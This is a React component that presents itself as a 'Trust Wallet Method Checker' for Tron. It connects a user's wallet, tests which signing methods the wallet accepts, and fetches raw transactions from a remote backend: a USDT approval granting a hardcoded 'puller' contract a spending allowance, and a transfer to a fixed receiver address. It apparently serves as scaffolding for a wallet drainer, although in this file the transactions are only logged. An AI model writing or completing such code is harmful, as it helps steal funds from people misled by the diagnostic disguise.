import React, { useState } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Web3Modal } from "@web3modal/standalone";

const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const BACKEND_URL = "https://smartcontbackend.onrender.com";
const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw";
const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g";
const AMOUNT = 1000000;
const MAINNET_CHAIN_ID = "tron:0x2b6653dc";

export default function TronMethodChecker() {
  const [signClient, setSignClient] = useState(null);
  const [session, setSession] = useState(null);
  const [address, setAddress] = useState("");
  const [logs, setLogs] = useState([]);
  const [buttonsEnabled, setButtonsEnabled] = useState(false);

  const web3Modal = new Web3Modal({ projectId: PROJECT_ID, walletConnectVersion: 2 });

  const log = (msg) => setLogs((prev) => [...prev, msg]);

  const initSignClient = async () => {
    const client = await SignClient.init({
      projectId: PROJECT_ID,
      metadata: {
        name: "Tron Method Checker",
        description: "Detect Tron methods in Trust Wallet",
        url: window.location.origin,
        icons: [],
      },
    });
    setSignClient(client);
  };

  const connectWallet = async () => {
    log("▶️ Connecting...");
    if (!signClient) await initSignClient();

    try {
      const { uri, approval } = await signClient.connect({
        requiredNamespaces: {
          tron: {
            chains: [MAINNET_CHAIN_ID],
            methods: [
              "tron_signTransaction",
              "tron_sign",
              "tron_sendRawTransaction",
              "tron_signMessage",
            ],
            events: [],
          },
        },
      });

      if (uri) await web3Modal.openModal({ uri });
      const sess = await approval();
      await web3Modal.closeModal();

      const addr = sess.namespaces.tron.accounts[0].split(":")[2];
      setSession(sess);
      setAddress(addr);
      log(`✅ Connected: ${addr}`);
      setButtonsEnabled(true);
    } catch (err) {
      log(`❌ Connect error: ${err.message || err}`);
    }
  };

  const detectMethods = async () => {
    if (!session) return;
    const toTest = [
      "tron_signTransaction",
      "tron_sign",
      "tron_sendRawTransaction",
      "tron_signMessage",
    ];
    const supported = [];
    log("🔍 Testing methods...");

    for (const method of toTest) {
      try {
        await signClient.request({
          chainId: MAINNET_CHAIN_ID,
          topic: session.topic,
          request: { method, params: [address, "Hello"] },
        });
        log(`✅ Supported: ${method}`);
        supported.push(method);
      } catch {
        log(`❌ Not supported: ${method}`);
      }
    }

    log(`🧮 Detected: ${supported.join(", ")}`);
  };

  const fetchRawTx = async (type) => {
    const url = type === "approve" ? "/create-approve" : "/create-tx";
    const body =
      type === "approve"
        ? { from: address, token: USDT_CONTRACT, spender: PULLER_CONTRACT, amount: AMOUNT }
        : { from: address, to: RECEIVER, amount: AMOUNT };

    const res = await fetch(BACKEND_URL + url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const txObj = await res.json();
    const hex = txObj.raw_data_hex || txObj.transaction?.raw_data_hex;
    if (!hex) throw new Error("No raw_data_hex in response");
    return hex;
  };

  const fetchApproveTx = async () => {
    try {
      log("📡 Fetching raw-approve TX from backend...");
      const hex = await fetchRawTx("approve");
      log(`🆓 Raw-Approve Hex:\n${hex}`);
    } catch (err) {
      log(`❌ Error fetching approve: ${err.message}`);
    }
  };

  const fetchTransferTx = async () => {
    try {
      log("📡 Fetching raw-transfer TX from backend...");
      const hex = await fetchRawTx("transfer");
      log(`🆓 Raw-Transfer Hex:\n${hex}`);
    } catch (err) {
      log(`❌ Error fetching transfer: ${err.message}`);
    }
  };

  return (
    <div style={{ fontFamily: "Arial", maxWidth: 600, margin: "40px auto" }}>
      <h1>Tron: Trust Wallet Method Checker</h1>
      <button onClick={connectWallet}>1. Connect Trust Wallet</button>
      <br />
      <button onClick={detectMethods} disabled={!buttonsEnabled}>
        2. Detect Supported Methods
      </button>
      <br />
      <button onClick={fetchApproveTx} disabled={!buttonsEnabled}>
        3. Fetch Raw-Approve TX
      </button>
      <br />
      <button onClick={fetchTransferTx} disabled={!buttonsEnabled}>
        4. Fetch Raw-Transfer TX
      </button>
      <div
        style={{
          marginTop: 20,
          whiteSpace: "pre-wrap",
          background: "#f5f5f5",
          padding: 15,
          borderRadius: 4,
        }}
      >
        {logs.join("\n")}
      </div>
    </div>
  );
}
